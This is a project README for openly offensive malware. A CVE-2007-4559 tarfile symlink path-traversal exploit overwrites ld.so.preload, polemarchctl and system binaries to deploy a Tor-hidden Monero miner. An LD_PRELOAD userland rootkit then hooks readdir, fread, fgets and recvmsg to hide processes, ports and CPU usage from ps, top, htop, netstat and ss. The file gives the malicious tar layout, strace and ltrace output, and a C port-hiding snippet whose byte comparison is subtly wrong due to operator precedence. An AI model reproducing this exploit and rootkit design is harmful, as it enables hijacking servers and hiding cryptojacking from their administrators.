# MALWARE project

The project consist of the following parts:

- **CVE-2007-4559 exploit**: path traversal exploit used to deploy the malware and overwrite several files
- **RCE**: overwriting the **polemarchctl** file to execute commands in the infected server
- **Cryptominer**: monero miner to be deployed into the infected server
- **Tor**: tor to hide miner connections to the miner pool
- **Rootkit**: user space rootkit to hide deployed malware from the infected server

## Path traversal exploit
Based the work from https://www.trellix.com/en-us/about/newsroom/stories/research/tarfile-exploiting-the-world.html.

We are able to overwrite several files by following https://mail.python.org/pipermail/python-dev/2007-August/074290.html:
> Another variety of this bug is a symlink one: if tar contains files like:
> ./aaaa-directory -> /etc
> ./aaaa-directory/passwd
> then the "aaaa-directory" symlink would be created first and /etc/passwd
> will be overwritten once again.

Meaning we will create a tar file with the following structure:

``` 
├── aaaa-directory -> /etc
├── ld.so.preload

├── bbbb-directory -> /usr/local/lib
├── rootkit.so

├── cccc-directory -> /opt/polemarch/bin
├── polemarchctl

├── dddd-directory -> /usr/bin
├── xmring
└── tor
```

And changing the **name metadata** of the different files in the following way:

```
# /etc directory
aaaa-directory -> /etc
  - name: DIRECTORY_EXPLOIT/aaaa-directory
ld.so.preload
  - name: DIRECTORY_EXPLOIT/aaaa-directory/ld.so.preload

# /usr/local/lib directory
bbbb-directory -> /usr/local/lib
  - name: DIRECTORY_EXPLOIT/bbbb-directory
rootkit.so
  - name: DIRECTORY_EXPLOIT/bbbb-directory/rootkit.so

# /opt/polemarch/bin directory
cccc-directory -> /opt/polemarch/bin
  - name: DIRECTORY_EXPLOIT/cccc-directory
polemarchctl
  - name: DIRECTORY_EXPLOIT/cccc-directory/polemarchctl

# /usr/bin directory
dddd-directory -> /usr/bin
  - name: DIRECTORY_EXPLOIT/dddd-directory
xmring
  - name: DIRECTORY_EXPLOIT/dddd-directory/xmring
```

In this way we are able to overwrite files by using symbolic links, as we do not have permissions to overwrite existing files.

An example in a real server:

```bash
root@7fda55a86d74:/# ls -l /test/
total 0
lrwxrwxrwx 1 1001 1001  5 Dec  8 12:30 aaaa -> /etc/
lrwxrwxrwx 1 1001 1001 15 Dec  8 12:30 bbbb -> /usr/local/lib/
lrwxrwxrwx 1 1001 1001  9 Dec  8 12:30 cccc -> /usr/bin/
lrwxrwxrwx 1 1001 1001 19 Dec  8 12:30 dddd -> /opt/polemarch/bin/
root@7fda55a86d74:/#
```

## RCE

## Rootkit
We have developed a rootkit which is able to hide itself from the following programs:

- ps
- top
- htop
- netstat
- ss

We are able to:
- Hide process
- Hide active connections
- Modify CPU usage
- Modify memory usage

### ps
Based on https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit

We are able to hide specific processes by preloading the **readdir** function from the **libc** library.

Whenever the **/proc** directory is read, we are able to modify the output the function to hide the entry PID corresponding to the processes we want to hide.

### top
By using the same technique as in **ps**, we are able to hide the processes from the **top** program.

We are also able to modify the CPU usage of the output.

In Linux, we have a file called **/proc/stat** which contains the CPU usage of the system.

Example:
```
cpu  375298 3939 83848 7151098 5118 0 2633 0 0 0
cpu0 49087 586 10190 2190399 1641 0 428 0 0 0
cpu1 48359 492 10326 708438 404 0 222 0 0 0
cpu2 48123 988 9607 708578 454 0 126 0 0 0
cpu3 44336 339 12504 708852 475 0 690 0 0 0
cpu4 43832 241 11591 706311 447 0 526 0 0 0
cpu5 46934 316 10449 709427 487 0 176 0 0 0
cpu6 46459 356 9584 709688 552 0 299 0 0 0
cpu7 48165 619 9594 709402 655 0 165 0 0 0
...
```

The top program read this file (the first line in this case) and computes the CPU usage of the system, as a percentage.

By looking at the strace output:

```bash
$: strace top -n 1 2>&1 | less

# Search /proc/stat
openat(AT_FDCWD, "/proc/stat", O_RDONLY) = 4
fstat(4, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
lseek(4, 0, SEEK_SET)                   = 0
read(4, "cpu  378331 3939 84538 7295728 5"..., 1024) = 1024
read(4, "0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 "..., 1024) = 1024
read(4, "0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 "..., 1024) = 1024
read(4, "0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 "..., 1024) = 1024
read(4, "0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 "..., 1024) = 684
read(4, "", 1024)                       = 0
```

We see that the top program reads the **/proc/stat** file in "chunks" of 1024 bytes.

By some trial and error, we can see that the program is using **fread** for reading the file (ltrace does not show any output for the top command).

So, by preloading the **fread** function from the **libc** library, we are able to modify the output of the function to modify the CPU usage of the system.

Note: we only modify the first line of the file, as the top program only reads the first line.

### htop
By using the same technique as in **ps**, we are able to hide the processes from the **top** program.

For modifying the CPU usage, the logic for modifying the **/proc/stat** file is the same as in **top**, but now we are modifying all
the lines of the files involving "cpu", as the htop program shows the CPU usage of each core.

Instead of preloading the **fread** function, we are preloading the **fgets** function, as the htop program reads the file line by line.

### netstat
The netstat reads several files in the **/proc** directory for displaying the active connections:
- /proc/net/tcp
- /proc/net/tcp6
- /proc/net/udp
- /proc/net/udp6

Where the kernel stores the information about the active connections, in the following format:

```
sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
```

By looking at the ltrace output we can see that it also using the **fgets** function for reading the files line by line.

```bash
$: ltrace netstat -n 1 2>&1 | grep "fgets" | less

fgets("  sl  local_address rem_address "..., 8192, 0x559b95e202a0) = 0x7fff86fcb110
fgets("   0: 0100007F:9ED5 00000000:000"..., 8192, 0x559b95e202a0) = 0x7fff86fcb110
fgets("   1: 017AA8C0:0035 00000000:000"..., 8192, 0x559b95e202a0) = 0x7fff86fcb110
fgets("   2: 0100007F:0277 00000000:000"..., 8192, 0x559b95e202a0) = 0x7fff86fcb110
fgets("   3: 4F5C7264:AB75 00000000:000"..., 8192, 0x559b95e202a0) = 0x7fff86fcb110

```

### ss
The ss program works is a different way than all the previous mentioned programs.

It uses the **recvmsg** function for interchanging active connections between the kernel and the user space.

The structures passed are pretty complex. Example:

```
recvmsg(3, {msg_name={sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, msg_namelen=12, msg_iov=[{iov_base=[{{len=88, type=SOCK_DIAG_BY_FAMILY,
flags=NLM_F_MULTI, seq=123456, pid=131170}, {udiag_family=AF_UNIX, udiag_type=SOCK_STREAM, udiag_state=TCP_ESTABLISHED, udiag_ino=50496, udiag_cook
ie=[8300, 0]}, [{{nla_len=25, nla_type=UNIX_DIAG_NAME}, ""}, {{nla_len=8, nla_type=UNIX_DIAG_PEER}, 50495}, {{nla_len=12, nla_type=UNIX_DIAG_RQLEN}
, {udiag_rqueue=0, udiag_wqueue=0}}, {{nla_len=5, nla_type=UNIX_DIAG_SHUTDOWN}, 0}]}, {{len=60, type=SOCK_DIAG_BY_FAMILY, flags=NLM_F_MULTI, seq=12
3456, pid=131170}, {udiag_family=AF_UNIX, udiag_type=SOCK_STREAM, udiag_state=TCP_ESTABLISHED, udiag_ino=203881, udiag_cookie=[8301, 0]}, [{{nla_le
n=8, nla_type=UNIX_DIAG_PEER}, 203880}, {{nla_len=12, nla_type=UNIX_DIAG_RQLEN}, {udiag_rqueue=0, udiag_wqueue=0}}, {{nla_len=5, nla_type=UNIX_DIAG
_SHUTDOWN}, 0}]}, {{len=60, type=SOCK_DIAG_BY_FAMILY, flags=NLM_F_MULTI, seq=123456, pid=131170}, {udiag_family=AF_UNIX, udiag_type=SOCK_STREAM, ud
iag_state=TCP_ESTABLISHED, udiag_ino=196944, udiag_cookie=[8302, 0]}, [{{nla_len=8, nla_type=UNIX_DIAG_PEER}, 196943}, {{nla_len=12, nla_type=UNIX_
DIAG_RQLEN}, {udiag_rqueue=0, udiag_wqueue=0}}, {{nla_len=5, nla_type=UNIX_DIAG_SHUTDOWN}, 0}]}, {{len=84, type=SOCK_DIAG_BY_FAMILY, flags=NLM_F_MU
LTI, seq=123456, pid=131170}, {udiag_family=AF_UNIX, udiag_type=SOCK_STREAM, udiag_state=TCP_ESTABLISHED, udiag_ino=62490, udiag_cookie=[8303, 0]},
 [{{nla_len=22, nla_type=UNIX_DIAG_NAME}, ""}, {{nla_len=8, nla_type=UNIX_DIAG_PEER}, 59845}, {{nla_len=12, nla_type=UNIX_DIAG_RQLEN}, {udiag_rqueu
e=0, udiag_wqueue=0}}, {{nla_len=5, nla_type=UNIX_DIAG_SHUTDOWN}, 0}]}, {{len=92, type=SOCK_DIAG_BY_FAMILY, flags=NLM_F_MULTI, seq=123456, pid=1311
70}, {udiag_family=AF_UNIX, udiag_type=SOCK_STREAM, udiag_state=TCP_ESTABLISHED, udiag_ino=50397, udiag_cookie=[8304, 0]}, [{{nla_len=32, nla_type=
UNIX_DIAG_NAME}, "/run/systemd/journal/stdout"}, {{nla_len=8, nla_type=UNIX_DIAG_PEER}, 52361}, {{nla_len=12, nla_type=UNIX_DIAG_RQLEN}, {udiag_rqu
eue=0, udiag_wqueue=0}}, {{nla_len=5, nla_type=UNIX_DIAG_SHUTDOWN}, 2}]}, {{len=60, type=SOCK_DIAG_BY_FAMILY, flags=NLM_F_MULTI, seq=123456, pid=13
1170}, {udiag_family=AF_UNIX, udiag_type=SOCK_STREAM, udiag_state=TCP_ESTABLISHED, udiag_ino=40790, udiag_cookie=[8305, 0]}, [{{nla_len=8, nla_type
=UNIX_DIAG_PEER}, 40791}, {{nla_len=12, nla_type=UNIX_DIAG_RQLEN}, {udiag_rqueue=0, udiag_wqueue=0}}, {{nla_len=5, nla_type=UNIX_DIAG_SHUTDOWN}, 0}
]}, {{len=92, type=SOCK_DIAG_BY_FAMILY, flags=NLM_F_MULTI, seq=123456, pid=131170}, {udiag_family=AF_UNIX, udiag_type=SOCK_STREAM, udiag_state=TCP_
ESTABLISHED, udiag_ino=36083, udiag_cookie=[8306, 0]}, [{{nla_len=32, nla_type=UNIX_DIAG_NAME}, "/run/dbus/system_bus_socket"}, {{nla_len=8, nla_ty
pe=UNIX_DIAG_PEER}, 36080}, {{nla_len=12, nla_type=UNIX_DIAG_RQLEN}, {udiag_rqueue=0, udiag_wqueue=0}}, {{nla_len=5, nla_type=UNIX_DIAG_SHUTDOWN},
0}]}, {{len=60, type=SOCK_DIAG_BY_FAMILY, flags=NLM_F_MULTI, seq=123456, pid=131170}, {udiag_family=AF_UNIX, udiag_type=SOCK_STREAM, udiag_state=TC
P_ESTABLISHED, udiag_ino=441015, udiag_cookie=[8307, 0]}, [{{nla_len=8, nla_type=UNIX_DIAG_PEER}, 441014}, {{nla_len=12, nla_type=UNIX_DIAG_RQLEN},
 {udiag_rqueue=0, udiag_wqueue=0}}, {{nla_len=5, nla_type=UNIX_DIAG_SHUTDOWN}, 0}]}, {{len=60, type=SOCK_DIAG_BY_FAMILY, flags=NLM_F_MULTI, seq=123456, pid=131170}, {udiag_family=AF_UNIX, udiag_type=SOCK_SEQPACKET, udiag_state=TCP_ESTABLISHED, udiag_ino=192713, udiag_cookie=[8308, 0]}, [{{nla_len=8, nla_type=UNIX_DIAG_PEER}, 192714}, {{nla_len=12, nla_type=UNIX_DIAG_RQLEN}, {udiag_rqueue=0, udiag_wqueue=0}}, {{nla_len=5, nla_type=UNIX_DIAG_SHUTDOWN}, 1}]}, {{len=104, type=SOCK_DIAG_BY_FAMILY, flags=NLM_F_MULTI, seq=123456, pid=131170}, {udiag_family=AF_UNIX, udiag_type=SOCK_STREAM, udiag_state=TCP_ESTABLISHED, udiag_ino=121802, udiag_cookie=[8309, 0]}, [{{nla_len=42, nla_type=UNIX_DIAG_NAME}, "/run/containerd/containerd.sock."...}, {{nla_len=8, nla_type=UNIX_DIAG_PEER}, 123313}, {{nla_len=12, nla_type=UNIX_DIAG_RQLEN}, {udiag_rqueue=0, udiag_wqueue=0}}, {{nla_len=5, nla_type=UNIX_DIAG_SHUTDOWN}, 0}]}, {{len=84, type=SOCK_DIAG_BY_FAMILY, flags=NLM_F_MULTI, seq=123456, pid=131170}, {udiag_family=AF_UNIX, udiag_type=SOCK_STREAM, udiag_state=TCP_ESTABLISHED, udiag_ino=61413, udiag_cookie=[8310, 0]}, [{{nla_len=23, nla_type=UNIX_DIAG_NAME}, "/run/user/1001/bus"}, {{nla_len=8, nla_type=UNIX_DIAG_PEER}, 57216}, {{nla_len=12, nla_type=UNIX_DIAG_RQLEN}, {udiag_rqueue=0, udiag_wqueue=0}}, {{nla_len=5, nla_type=U
```

As we are interested on hiding some ports, we will just preload the **recvmsg** function and look for two bytes which match our port:

```c
for (int i = 0; i < buffer_size; i++)
{
    if (((buffer[i]) == (port_to_hide >> 8) & 0xFF) &&
        buffer[i + 1] == (port_to_hide & 0xFF))
    {
        // Hide port
        buffer[i] = 0x00;
        buffer[i + 1] = 0x00;
    }
};
```
